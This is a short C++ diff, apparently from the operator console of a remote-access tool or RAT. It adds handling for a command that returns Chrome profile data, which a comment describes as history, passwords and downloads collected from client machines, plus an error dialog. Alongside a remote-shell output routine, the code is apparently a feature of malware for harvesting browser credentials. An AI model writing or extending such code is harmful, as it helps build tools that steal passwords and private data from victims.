@@ -501,6 +501,26 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
         return;
     }
 
+    //mod informacion - Procesar informacion de perfil (historial/passwords/descargas)
+    if (iComando == EnumComandos::INF_Chrome_Profile_Data_Out) {
+        if (this->m_isFrameVisible()) {
+            panelInfoChrome* temp_pn = (panelInfoChrome*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Info, this->n_Frame);
+            if (temp_pn) {
+                std::string strData(paquete.cBuffer.data());
+                temp_pn->m_ProcesarInfoPerfil(strData);
+            }
+        }
+        return;
+    }
+
+    //mod informacion - No se pudo obtener la informacion solicitada
+    if (iComando == EnumComandos::INF_Error) {
+        if (this->m_isFrameVisible()) {
+            wxMessageBox("No se pudo obtener la informacion", "Error", 5L, this->n_Frame);
+        }
+        return;
+    }
+
 }
 
 void Cliente_Handler::EscribirSalidaShell(const char*& cBuffer) {
